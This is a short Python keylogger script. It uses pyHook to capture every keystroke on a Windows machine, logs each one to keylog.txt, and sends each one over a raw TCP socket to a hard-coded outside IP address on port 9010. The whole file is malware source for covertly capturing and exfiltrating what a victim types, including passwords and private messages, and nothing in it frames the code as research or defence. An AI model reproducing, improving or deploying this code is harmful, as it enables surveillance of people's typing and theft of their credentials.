import sys, pyHook, pythoncom, logging, socket

file_log = "keylog.txt"

def OnKeyboardEvent(event):
    logging .basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    strf = str(chr(event.Ascii))
    print(strf)
    eggs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    eggs.connect(('107.170.79.196', 9010))
    eggs.sendall(strf)

    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager ()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()

